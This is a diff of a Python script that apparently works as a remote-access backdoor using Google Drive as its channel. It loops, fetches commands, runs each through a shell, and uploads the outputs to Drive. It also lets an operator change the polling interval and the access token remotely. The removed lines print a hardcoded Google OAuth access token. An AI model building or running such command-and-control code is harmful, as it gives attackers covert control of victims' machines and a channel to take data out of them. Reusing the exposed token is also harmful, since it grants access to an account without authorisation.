@@ -96,7 +96,7 @@ def trashed_file(service, is_delete_trashed_file=False):
                 delete_drive_service_file(service, file_id=item['id'])
 
  
-def upload(is_update_file_function=False, update_drive_service_name=None, update_file_path=None):
+def upload(is_update_file_function=False, update_drive_service_name=None, update_file_path=None, access_token=None):
     """
     :param is_update_file_function: 判斷是否執行上傳的功能
     :param update_drive_service_name: 要上傳到雲端上的檔案名稱
@@ -109,7 +109,7 @@ def upload(is_update_file_function=False, update_drive_service_name=None, update
 
     # store = file.Storage('token.json')
     # creds = store.get()
-    creds = client.AccessTokenCredentials("ya29.a0AX9GBdWHNxEX10fEZNhyne8A9Ao31f1-YFsSEkRYu-dBf_vLGdzSfpRcWkvJIKs4Nu2nnGcBzOK6wszczz4oSWbSRoZ5rgiGRxiAqdGPOmVUwEKKnFp4udkis6JLgqjejLdp_s49C_3A92uEtmW1TrdQXybuxtFBaCgYKAcMSAQASFQHUCsbChWq3VoPySrrhGZRqELkHvg0167", '')
+    creds = client.AccessTokenCredentials(access_token, '')
 
     if not creds or creds.invalid:
         flow = client.flow_from_clientsecrets('credentials.json', SCOPES)
@@ -137,7 +137,7 @@ def upload(is_update_file_function=False, update_drive_service_name=None, update
 if __name__ == '__main__':
     oldCommands = []
     interval = 5
-
+    access_token = ""
     while True:
         time.sleep(interval)
 
@@ -160,17 +160,24 @@ if __name__ == '__main__':
         outputs = []
         for command in commands:
             if command == 'die': sys.exit()
-            elif 'sleep ' in commands[0]:
-                interval = int(commands[0][6:])
-                continue
-
-            pipe = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            res = pipe.communicate()
-            if res[1]: outputs.append(res[1].decode())
-            else: outputs.append(res[0].decode())
+            elif 'sleep ' in command:
+                interval = int(command[6:])
+                outputs.append(f"sleep interval was changed to {interval} sec.\n")
+            elif 'token ' in command:
+                access_token = command[6:]
+                outputs.append(f"access token was changed to {access_token}.\n")
+            else:
+                pipe = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                res = pipe.communicate()
+                if res[1]: outputs.append(res[1].decode())
+                else: outputs.append(res[0].decode())
 
         with open('outputs.txt', 'w') as f:
             for command, output in zip(commands, outputs):
                 f.write(f'> {command}\n{output}\n')
 
-        upload(is_update_file_function=bool(True), update_drive_service_name='outputs.txt', update_file_path=os.getcwd() + '/')
+        try:
+            upload(is_update_file_function=bool(True), update_drive_service_name='outputs.txt', update_file_path=os.getcwd() + '/', access_token=access_token)
+        except:
+            print("invalid access token")
+            interval = 10
